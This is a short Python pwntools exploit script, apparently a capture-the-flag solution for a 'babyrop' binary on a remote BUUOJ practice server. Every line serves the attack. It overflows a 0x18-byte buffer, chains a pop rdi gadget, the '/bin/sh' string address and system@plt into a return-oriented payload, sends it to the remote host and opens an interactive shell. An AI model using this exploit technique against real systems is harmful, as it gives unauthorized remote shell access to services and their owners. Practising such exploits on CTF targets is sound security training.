#coding:utf-8
from pwn import *
import pwnlib
# sh = process("./babyrop")
sh = remote("node3.buuoj.cn",25918)
elf = ELF("./babyrop")
pop_rdi = 0x400683
ret = 0x400479
bin_sh = elf.search('/bin/sh').next()
system_addr = elf.plt['system']
payload = 'a' * 0x18
payload += p64(pop_rdi)  + p64(bin_sh) + p64(system_addr) + p64(ret)
sh.sendline(payload)
sh.interactive()